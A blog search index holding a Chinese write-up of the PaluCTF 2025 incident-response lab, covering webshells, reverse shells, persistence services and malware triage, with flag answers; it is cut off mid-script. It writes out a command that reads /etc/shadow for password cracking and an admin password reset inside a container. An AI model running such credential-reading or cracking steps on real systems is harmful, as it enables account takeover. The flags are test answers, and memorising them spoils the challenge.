<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PaluCTF 2025 应急响应 Writeup</title>
      <link href="/blog/2025/05/21/CTF-WP/PaluCTF%202025/"/>
      <url>/blog/2025/05/21/CTF-WP/PaluCTF%202025/</url>
      
        <content type="html"><![CDATA[<h2 id="solar-Linux后门排查（复现）"><a href="#solar-Linux后门排查（复现）" class="headerlink" title="solar_Linux后门排查（复现）"></a>solar_Linux后门排查（复现）</h2><p>题目描述</p><p>跳板机疑似被遗留后门,请排查<br>1、找到可疑进程完整路径<br>2、找到被横向的服务器IP<br>3、连接被横向服务器<br>flag格式为 flag{base64{完整路径}|服务器IP|服务器中flag文本}<br>root:Solar@2025_05_palu!</p><p><code>palu&#123;L3Vzci9saWIvc3lzdGVtZC9zeXN0ZW1kLWxvZ2lu|49.232.112.164|ZX0001S&#125;</code></p><p>连接服务器执行<code>ss</code>就能看到恶意IP<code>49.232.112.164</code>根据进程找到绝对路径</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-0.png"></p><p>进程为<code>/usr/lib/systemd/systemd-login</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-1.png"></p><p>最后ssh连上去即可获得flag<code>ZX0001S</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-2.png"></p><h2 id="应急响应-畸形的爱"><a href="#应急响应-畸形的爱" class="headerlink" title="应急响应 - 畸形的爱"></a>应急响应 - 畸形的爱</h2><p>官方附件密码<code>Parloo&amp;zgsfsys&amp;onefox&amp;solar**juyt</code></p><p><a href="https://www.yuque.com/attachments/yuque/0/2025/pdf/29320229/1747636530982-bb9a643f-55e7-450d-a6a3-3f2708c61090.pdf">应急响应之畸形的爱.pdf</a></p><p>做这题的注意事项：<br>1、虚拟机解压后是挂起状态，不要重启，否则可能会解不出个别题目</p><p>2、要把Webserver中的IP手动改为<code>192.168.87.101</code>，否则会出现docker容器无法启动的问题</p><h3 id="应急响应1-1-提交攻击者使用的攻击ip地址1"><a href="#应急响应1-1-提交攻击者使用的攻击ip地址1" class="headerlink" title="应急响应1-1 提交攻击者使用的攻击ip地址1"></a>应急响应1-1 提交攻击者使用的攻击ip地址1</h3><p><code>palu&#123;192.168.31.240&#125;</code></p><p>首先，在<code>/var/www/html</code>目录下可以看到一个木马<code>a.php</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-3.png"></p><p>所以黑客肯定连上过这个webshell，直接去翻看<code>/var/log/nginx/accexs.log.1</code>的日志可以找到第一个攻击IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> access.log.1 | grep <span class="string">&quot;a.php&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/5/21/image-4.png"></p><h3 id="应急响应1-2-提交攻击者使用的攻击ip地址2"><a href="#应急响应1-2-提交攻击者使用的攻击ip地址2" class="headerlink" title="应急响应1-2 提交攻击者使用的攻击ip地址2"></a>应急响应1-2 提交攻击者使用的攻击ip地址2</h3><p><code>palu&#123;192.168.31.11&#125;</code></p><p>要从虚拟机挂起状态启动webserver才能在网络连接状态里面看到第二个攻击者的IP</p><p>这里实际是一堆反弹shell在回连<code>192.168.31.11</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anotp</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/5/21/image-5.png"></p><p>另外一种思路：</p><p>如果无法打开挂起状态可以在docker容器中可以看到一个<code>clean.sh</code></p><p>里面就是反弹shell的命令，地址就是<code>192.168.31.11</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-6.png"></p><h3 id="应急响应1-3（复现）题解攻击者暴力破解开始时间"><a href="#应急响应1-3（复现）题解攻击者暴力破解开始时间" class="headerlink" title="应急响应1-3（复现）题解攻击者暴力破解开始时间"></a>应急响应1-3（复现）题解攻击者暴力破解开始时间</h3><p><code>palu&#123;2025:03:05:58&#125;</code></p><p>通过查找docker中的phpmyadmin的运行日志可以看到在<code>2025:03:05:58</code>开始，有大量的POST登录请求</p><p>这大量的请求就是登录爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs 680</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/5/21/image-7.png"></p><h3 id="应急响应1-4-提交攻击者留下的flag1"><a href="#应急响应1-4-提交攻击者留下的flag1" class="headerlink" title="应急响应1-4   提交攻击者留下的flag1"></a>应急响应1-4   提交攻击者留下的flag1</h3><p><code>palu&#123;pc3_zgsfqwerlkssaw&#125;</code></p><p>打开<code>Win10 PC-2</code>的任务计划程序即可看到flag1</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-8.png"></p><h3 id="应急响应1-5-提交攻击者留下的flag2"><a href="#应急响应1-5-提交攻击者留下的flag2" class="headerlink" title="应急响应1-5 提交攻击者留下的flag2"></a>应急响应1-5 提交攻击者留下的flag2</h3><p><code>palu&#123;nizhidaowoyouduoainima&#125;</code></p><p>点击flag1计划任务里面的操作，可以看到指向了一个<code>a.bat</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-9.png"></p><p>打开就能看到flag</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-10.png"></p><h3 id="应急响应1-6-提交攻击者留下的flag3"><a href="#应急响应1-6-提交攻击者留下的flag3" class="headerlink" title="应急响应1-6 提交攻击者留下的flag3"></a>应急响应1-6 提交攻击者留下的flag3</h3><p><code>palu&#123;sqlaabbccsbwindows&#125;</code></p><p>先在Webserver服务器中查看数据库连接密码，然后再进入Mysql虚拟机查看数据库详情</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-11.png"></p><p>进入数据库中可以看到一个1066订单，里面数据其实就是Base64编码而已</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-12.png"></p><p>或者在订单查询系统输入<code>ORD-2023-1066</code>也可以看到flag</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-13.png"></p><h3 id="应急响应1-7-提交钓鱼文件的哈希32位大写"><a href="#应急响应1-7-提交钓鱼文件的哈希32位大写" class="headerlink" title="应急响应1-7 提交钓鱼文件的哈希32位大写"></a>应急响应1-7 提交钓鱼文件的哈希32位大写</h3><p><code>palu&#123;2977CDAB8F3EE5EFDDAE61AD9F6CF203&#125;</code></p><p>查看内网通里面的聊天记录可以知道，王美欣是被钓鱼的用户</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-14.png"></p><p>简历.zip解压后是一个简历.exe文件</p><p>扔微步云沙箱就能知道这个文件就是钓鱼文件</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-15.png"></p><h3 id="应急响应1-8（复现）提交攻击者留下的webshell-1密码"><a href="#应急响应1-8（复现）提交攻击者留下的webshell-1密码" class="headerlink" title="应急响应1-8（复现）提交攻击者留下的webshell-1密码"></a>应急响应1-8（复现）提交攻击者留下的webshell-1密码</h3><p><code>palu&#123;hack&#125;</code></p><p>在Webserver的docker容器ec87eb8a81c7里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it ec87eb8a81c7 /bin/sh</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/5/21/image-16.png"></p><h3 id="应急响应1-9（复现）提交攻击者开放端口"><a href="#应急响应1-9（复现）提交攻击者开放端口" class="headerlink" title="应急响应1-9（复现）提交攻击者开放端口"></a>应急响应1-9（复现）提交攻击者开放端口</h3><p><code>palu&#123;1133,1144,8084&#125;</code></p><p>在Webserver中的定时任务找到了第一个开放端口（如果重启了虚拟机就看不到这个文件）</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-17.png"></p><p>在docker内的clear.sh也可以看到第二个端口</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-18.png"></p><p>在<code>Win10 PC2</code>的网络连接状态中找到了第三个端口（如果重启了虚拟机就看不到这个网络连接状态）</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-19.png"></p><h3 id="应急响应1-10-提交攻击者留下的webshell密码2"><a href="#应急响应1-10-提交攻击者留下的webshell密码2" class="headerlink" title="应急响应1-10 提交攻击者留下的webshell密码2"></a>应急响应1-10 提交攻击者留下的webshell密码2</h3><p><code>palu&#123;00232&#125;</code></p><p>在Webserver中的<code>a.php</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-20.png"></p><h3 id="应急响应1-11-提交攻击者留下的隐藏账户的密码"><a href="#应急响应1-11-提交攻击者留下的隐藏账户的密码" class="headerlink" title="应急响应1-11 提交攻击者留下的隐藏账户的密码"></a>应急响应1-11 提交攻击者留下的隐藏账户的密码</h3><p><code>palu&#123;wmx_love&#125;</code></p><p> 在计算机管理中可以找到名为<code>system$</code>的隐藏账号</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-21.png"></p><p>使用<code>proactive system password recovery</code>查看用户密码hash</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-22.png"></p><p>然后放到cmd5解密（要钱）</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-23.jpeg"></p><h3 id="应急响应1-12（复现）溯源攻击者的邮箱"><a href="#应急响应1-12（复现）溯源攻击者的邮箱" class="headerlink" title="应急响应1-12（复现）溯源攻击者的邮箱"></a>应急响应1-12（复现）溯源攻击者的邮箱</h3><p><code>palu&#123;n0k4u@outlook.com&#125;</code></p><p>用IDA看<code>简历.exe</code>重可以看到一个特殊的用户名<code>n0k4u</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-24.png"></p><p>直接搜这个名字可以看到一个Github项目</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-25.png"></p><p>用GitHub的接口反查邮箱<code>https://api.github.com/users/&lt;用户名&gt;/events/public</code></p><p><a href="https://api.github.com/users/n0k4u/events/public">https://api.github.com/users/n0k4u/events/public</a></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-26.png"></p><h3 id="应急响应1-13（复现）提交溯源后得到的flag"><a href="#应急响应1-13（复现）提交溯源后得到的flag" class="headerlink" title="应急响应1-13（复现）提交溯源后得到的flag"></a>应急响应1-13（复现）提交溯源后得到的flag</h3><p><code>palu&#123;loveyouibiejv&#125;</code></p><p>进入他的GitHub可以看到一个项目</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-27.png"></p><p>查看历史提交信息</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-28.png"></p><p>发现一个疑似QQ号</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-29.png"></p><p>flag在添加好友处</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-30.png"></p><h2 id="应急响应主线"><a href="#应急响应主线" class="headerlink" title="应急响应主线"></a>应急响应主线</h2><p>官方附件解压密码<code>Skills@@@Skills@@@Skills</code></p><p><a href="https://www.yuque.com/attachments/yuque/0/2025/pdf/29320229/1747720192499-99d0591e-50fc-45f0-9c22-7fa502694a1b.pdf">第二届“Parloo”CTF应急响应挑战赛应急响应场景挑战说明手册.pdf</a></p><h3 id="应急响应2-1-提交堡垒机中留下的flag"><a href="#应急响应2-1-提交堡垒机中留下的flag" class="headerlink" title="应急响应2-1 提交堡垒机中留下的flag"></a>应急响应2-1 提交堡垒机中留下的flag</h3><p><code>palu&#123;2025_qiandao_flag&#125;</code></p><p>登录堡垒机，在标签列表处就能看到flag</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-31.png"></p><h3 id="应急响应2-2-提交WAF中隐藏的flag"><a href="#应急响应2-2-提交WAF中隐藏的flag" class="headerlink" title="应急响应2-2 提交WAF中隐藏的flag"></a>应急响应2-2 提交WAF中隐藏的flag</h3><p><code>palu&#123;2025_waf&#125;</code></p><p>点击身份验证-配置就能看到flag</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-32.png"></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-33.png"></p><h3 id="应急响应2-3-提交Mysql中留下的flag"><a href="#应急响应2-3-提交Mysql中留下的flag" class="headerlink" title="应急响应2-3 提交Mysql中留下的flag"></a>应急响应2-3 提交Mysql中留下的flag</h3><p><code>palu&#123;Mysql_@2025&#125;</code></p><p>我直接在server01的1Panel面板上装了个phpMyAdmin进行分析，连接信息如下</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-34.png"></p><p>登录进去后就能看到flag</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-35.png"></p><h3 id="应急响应2-4-提交攻击者的攻击IP"><a href="#应急响应2-4-提交攻击者的攻击IP" class="headerlink" title="应急响应2-4 提交攻击者的攻击IP"></a>应急响应2-4 提交攻击者的攻击IP</h3><p><code>palu&#123;192.168.20.107&#125;</code></p><p>这个很容易找，就在WAF日志中就能看到攻击者是<code>192.168.20.107</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-36.png"></p><p>提一嘴，雷池WAF默认访问日志位置在<code>/data/safeline/logs/nginx/safeline</code></p><p>如果没专业版想导出日志看的可以在这个位置找到</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-37.png">  </p><h3 id="应急响应2-5-提交攻攻击者最早攻击时间"><a href="#应急响应2-5-提交攻攻击者最早攻击时间" class="headerlink" title="应急响应2-5 提交攻攻击者最早攻击时间"></a>应急响应2-5 提交攻攻击者最早攻击时间</h3><p><code>palu&#123;2025-05-05-00:04:40&#125;</code></p><p>攻击最早时间就在右边（这题一开始被官方给的错误格式坑了）</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-38.png"></p><p><font style="color:rgb(238, 238, 238);"></font></p><h3 id="应急响应2-6-提交web服务泄露的关键文件名"><a href="#应急响应2-6-提交web服务泄露的关键文件名" class="headerlink" title="应急响应2-6 提交web服务泄露的关键文件名"></a>应急响应2-6 提交web服务泄露的关键文件名</h3><p><code>palu&#123;key.txt&#125;</code></p><p>在WAF中的web服务里可以看到一个<code>key.txt</code>他就是泄露的文件</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-39.png"></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-40.png"></p><h3 id="应急响应2-7-题解泄露的邮箱地址"><a href="#应急响应2-7-题解泄露的邮箱地址" class="headerlink" title="应急响应2-7 题解泄露的邮箱地址"></a>应急响应2-7 题解泄露的邮箱地址</h3><p><code>palu&#123;parloo@parloo.com&#125;</code></p><p>key.txt文件一直向右拉就可以看到一个邮箱</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-41.png"><font style="color:rgb(238, 238, 238);"><br></font></p><h3 id="应急响应2-8-提交立足点服务器ip地址"><a href="#应急响应2-8-提交立足点服务器ip地址" class="headerlink" title="应急响应2-8 提交立足点服务器ip地址"></a>应急响应2-8 提交立足点服务器ip地址</h3><p><code>palu&#123;192.168.20.108&#125;</code></p><p>在WAF中看到了有从<code>SSH Server</code>运维机出来的攻击流量，猜测立足点就是 <code>192.168.20.108</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-42.png"></p><h3 id="应急响应2-9-提交攻击者使用的提权的用户和密码"><a href="#应急响应2-9-提交攻击者使用的提权的用户和密码" class="headerlink" title="应急响应2-9 提交攻击者使用的提权的用户和密码"></a>应急响应2-9 提交攻击者使用的提权的用户和密码</h3><p><code>palu&#123;parloo/parloo&#125;</code></p><p>既然知道了攻击者立足点为192.168.20.108所以直接来看SSH Server里面是否有疑似账号就行了</p><p>这机子感觉做了什么手脚，SSH无法连且登录进去要很久，只要输入完账号密码后按<code>Ctrl+C</code>就可以快速进入</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-43.png"></p><p>先将/etc/passwd文件和/etc/shadow文件合并成一个.txt文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unshadow /etc/passwd /etc/shadow &gt; 1.txt</span><br></pre></td></tr></table></figure><p>然后在ssh里面开了一个python服务把文件放到了另一台机子用john跑parloo账号的密码</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-44.png"></p><h3 id="应急响应2-10-提交攻击者留下的的文件内容作为flag提交"><a href="#应急响应2-10-提交攻击者留下的的文件内容作为flag提交" class="headerlink" title="应急响应2-10  提交攻击者留下的的文件内容作为flag提交"></a>应急响应2-10  提交攻击者留下的的文件内容作为flag提交</h3><p><code>palu&#123;hi_2025_parloo_is_hack&#125;</code></p><p>就在parloo用户的家目录里面</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-45.png"></p><h3 id="应急响应2-11（复现）提交权限维持方法服务的名称"><a href="#应急响应2-11（复现）提交权限维持方法服务的名称" class="headerlink" title="应急响应2-11（复现）提交权限维持方法服务的名称"></a>应急响应2-11（复现）提交权限维持方法服务的名称</h3><p><code>palu&#123;rootset&#125;</code></p><p>运行以下命令可以看到两个可疑的运行中的服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-units --<span class="built_in">type</span>=service </span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/5/21/image-46.png"></p><p>查看服务运行状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl status rootset.service</span><br><span class="line">systemctl status rootset-test.service</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/5/21/image-47.png"></p><p>两个服务都指向了一个文件<code>/usr/bin/b4b40c44ws</code></p><p>开个python的http服务下载下来扔微步云沙箱发现是木马</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-48.png"></p><p>所以就能猜测是权限维持服务</p><h3 id="应急响应2-12-提交攻击者攻击恶意服务器连接地址作为flag提交"><a href="#应急响应2-12-提交攻击者攻击恶意服务器连接地址作为flag提交" class="headerlink" title="应急响应2-12 提交攻击者攻击恶意服务器连接地址作为flag提交"></a>应急响应2-12 提交攻击者攻击恶意服务器连接地址作为flag提交</h3><p><code>palu&#123;47.101.213.153&#125;</code></p><p>把<code>b4b40c44ws</code>扔进IDA查看即可看到服务器恶意连接地址</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-49.png"></p><h3 id="应急响应2-13（复现）找到系统中被劫持的程序程序名作为flag提交"><a href="#应急响应2-13（复现）找到系统中被劫持的程序程序名作为flag提交" class="headerlink" title="应急响应2-13（复现）找到系统中被劫持的程序程序名作为flag提交"></a>应急响应2-13（复现）找到系统中被劫持的程序程序名作为flag提交</h3><p><code>palu&#123;id&#125;</code></p><p>首先查看一下权限维持木马的创建时间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stat</span> b4b40c44ws</span><br></pre></td></tr></table></figure><p>然后根据这个时间查看5月7号当天被修改的文件就能看到<code>id</code>这个一起被修改的程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /usr -<span class="built_in">type</span> f -nawermt <span class="string">&quot;2025-05-7&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/5/21/image-50.png"></p><h3 id="应急响应2-14-找到系统中存在信息泄露的服务运行端口作为flag提交"><a href="#应急响应2-14-找到系统中存在信息泄露的服务运行端口作为flag提交" class="headerlink" title="应急响应2-14 找到系统中存在信息泄露的服务运行端口作为flag提交"></a>应急响应2-14 找到系统中存在信息泄露的服务运行端口作为flag提交</h3><p><code>palu&#123;8081&#125;</code></p><p>打开Server01的1Panel面板可以看到有两个站点</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-51.png"></p><p>其中第一个站点是一个员工档案管理</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-52.png"></p><p>查看页面源码可以发现泄露了敏感信息，所以就是8081端口</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-53.png"></p><h3 id="应急响应2-15-提交Parloo公司项目经理的身份证号作为flag提交"><a href="#应急响应2-15-提交Parloo公司项目经理的身份证号作为flag提交" class="headerlink" title="应急响应2-15 提交Parloo公司项目经理的身份证号作为flag提交"></a>应急响应2-15 提交Parloo公司项目经理的身份证号作为flag提交</h3><p><code>palu&#123;310105198512123456&#125;</code><br>在上一题的页面源码就能看到相关身份证信息</p><h3 id="应急响应2-16（复现）提交存在危险功能的操作系统路径作为flag提交"><a href="#应急响应2-16（复现）提交存在危险功能的操作系统路径作为flag提交" class="headerlink" title="应急响应2-16（复现）提交存在危险功能的操作系统路径作为flag提交"></a>应急响应2-16（复现）提交存在危险功能的操作系统路径作为flag提交</h3><p><code>palu&#123;/admin/parloo&#125;</code></p><p>这题估计得看完gitea里面留下的维护页文件后才能大致知道思路，管理员在服务器上开了一个维护页面</p><p>进容器执行以下命令更改admin的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it 224d7f8df25c /bin/bash</span><br><span class="line">su git</span><br><span class="line"><span class="built_in">cd</span> /app/gitea</span><br><span class="line">./gitea admin user change-password --username admin --password admin123</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/5/21/image-54.png"></p><p>然后登录gitea就能看到在仓库放的维护页面源码</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-55.png"></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-56.png"></p><p>当时是真没想到这个页面开在了server服务器里，端口为8080（当时就疑惑这个页面开放在哪里）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -lanp</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/5/21/image-57.png"></p><p>而且可以执行恶意命令，所以flag就是<code>/admin/parloo</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-58.png"></p><h3 id="应急响应2-17（复现）提交进源机器中恶意程序的MD5作为flag进行提交"><a href="#应急响应2-17（复现）提交进源机器中恶意程序的MD5作为flag进行提交" class="headerlink" title="应急响应2-17（复现）提交进源机器中恶意程序的MD5作为flag进行提交"></a>应急响应2-17（复现）提交进源机器中恶意程序的MD5作为flag进行提交</h3><p><code>palu&#123;0f80a82621b8c4c3303d198d13776b34&#125;</code></p><p>被近源机器03一开机就会有个程序报错，而且放的位置很难不引起怀疑（当时我没怀疑这个报错亲手关了 Dogs）</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-59.png"></p><p>扔沙箱之后就能发现是恶意程序了</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-60.png"></p><p>但是答案不对，最后在临时目录下看见另一个svhost.exe文件，文件大小不一样，扔沙箱还是显示木马</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-61.png"></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-62.png"></p><h3 id="应急响应2-18-提交攻击者留下的恶意账户名称md5后作为flag进行提交"><a href="#应急响应2-18-提交攻击者留下的恶意账户名称md5后作为flag进行提交" class="headerlink" title="应急响应2-18 提交攻击者留下的恶意账户名称md5后作为flag进行提交"></a>应急响应2-18 提交攻击者留下的恶意账户名称md5后作为flag进行提交</h3><p><code>palu&#123;d78b6f30225cdc811adfe8d4e7c9fd34&#125;</code></p><p>在进入被近源的机子系统前就可以看到多了一个hack账号</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-63.png"></p><h3 id="应急响应2-19-提交内部群中留下的flag并提交"><a href="#应急响应2-19-提交内部群中留下的flag并提交" class="headerlink" title="应急响应2-19 提交内部群中留下的flag并提交"></a>应急响应2-19 提交内部群中留下的flag并提交</h3><p><code>palu&#123;nbq_nbq_parloo&#125;</code></p><p>就在内网通的聊天记录里</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-64.png"></p><h3 id="应急响应2-20-请提交攻击者使用维护页面获取到的敏感内容作为flag进行提交"><a href="#应急响应2-20-请提交攻击者使用维护页面获取到的敏感内容作为flag进行提交" class="headerlink" title="应急响应2-20 请提交攻击者使用维护页面获取到的敏感内容作为flag进行提交"></a>应急响应2-20 请提交攻击者使用维护页面获取到的敏感内容作为flag进行提交</h3><p><code>palu&#123;Server_Parloo_2025&#125;</code></p><p>还记得gitea仓库里面的带有危险功能的页面吗，在源码中日志文件的名字为<code>command.log</code></p><p>所以直接全局搜这个文件即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&#x27;command.log&#x27;</span></span><br></pre></td></tr></table></figure><p>真正的日志文件就在<code>/var/log/parloo/command.log</code></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-65.png"></p><p>在631行中可以看到一个flag</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-66.png"></p><h3 id="应急响应2-21-提交获取敏感内容IP的第一次执行命令时间作为flag进行提交"><a href="#应急响应2-21-提交获取敏感内容IP的第一次执行命令时间作为flag进行提交" class="headerlink" title="应急响应2-21 提交获取敏感内容IP的第一次执行命令时间作为flag进行提交"></a>应急响应2-21 提交获取敏感内容IP的第一次执行命令时间作为flag进行提交</h3><p><code>palu&#123;2025-05-04:15:30:38&#125;</code></p><p>看日志第一行的时间就行<img src="https://img.beiko.top/blog/2025/5/21/image-67.png"></p><h3 id="应急响应2-22-提交攻击者使用的恶意ip和端口"><a href="#应急响应2-22-提交攻击者使用的恶意ip和端口" class="headerlink" title="应急响应2-22  提交攻击者使用的恶意ip和端口"></a>应急响应2-22  提交攻击者使用的恶意ip和端口</h3><p><code>palu&#123;10.12.12.13:9999&#125;</code></p><p>还是看日志文件就行</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-68.png"></p><h3 id="应急响应2-23（复现）提交重要数据的名文内容作为flag提交"><a href="#应急响应2-23（复现）提交重要数据的名文内容作为flag提交" class="headerlink" title="应急响应2-23（复现）提交重要数据的名文内容作为flag提交"></a>应急响应2-23（复现）提交重要数据的名文内容作为flag提交</h3><p><code>palu&#123;Password-000&#125;</code></p><p>在gitea仓库中是存有hack的一个加密脚本的</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-69.png"></p><p><img src="https://img.beiko.top/blog/2025/5/21/image-70.png"></p><p>密文就在被近源机器03的桌面上</p><p><img src="https://img.beiko.top/blog/2025/5/21/image-71.png"></p><p>因为没有密钥，所以是猜测明文开头为<code>palu&#123;</code>让AI进行逆向分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">def custom_encrypt(text, key):</span><br><span class="line">    encrypted = []</span><br><span class="line">    key_bytes = [ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> key]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> enumerate(text):</span><br><span class="line">        shifted = ord(char) + (i % 5 + 1)</span><br><span class="line"></span><br><span class="line">        xor_key = key_bytes[i % len(key_bytes)]</span><br><span class="line">        xored = shifted ^ xor_key</span><br><span class="line">        substituted = ((xored &amp; 0x0F) &lt;&lt; <span class="string">4) | ((xored &amp; 0xF0) &gt;&gt; 4</span>)</span><br><span class="line">        encrypted.append(f<span class="string">&quot;&#123;substituted:02x&#125;&quot;</span>)</span><br><span class="line">    <span class="built_in">return</span> <span class="string">&quot;&quot;</span>.<span class="built_in">join</span>(encrypted)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def custom_decrypt(encrypted_text, key):</span><br><span class="line">    decrypted = []</span><br><span class="line">    key_bytes = [ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> key]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Process the encrypted text two characters at a time (hex pairs)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(0, len(encrypted_text), 2):</span><br><span class="line">        <span class="comment"># Convert hex pair to integer</span></span><br><span class="line">        substituted = int(encrypted_text[i : i + 2], 16)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Reverse nibble swap</span></span><br><span class="line">        xored = ((substituted &amp; 0x0F) &lt;&lt; <span class="string">4) | ((substituted &amp; 0xF0) &gt;&gt; 4</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Reverse XOR with key</span></span><br><span class="line">        xor_key = key_bytes[i // 2 % len(key_bytes)]</span><br><span class="line">        shifted = xored ^ xor_key</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Reverse the position-based shift</span></span><br><span class="line">        char_code = shifted - ((i // 2 % 5) + 1)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Convert back to character</span></span><br><span class="line">        decrypted.append(chr(char_code))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> <span class="string">&quot;&quot;</span>.<span class="built_in">join</span>(decrypted)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(custom_decrypt(<span 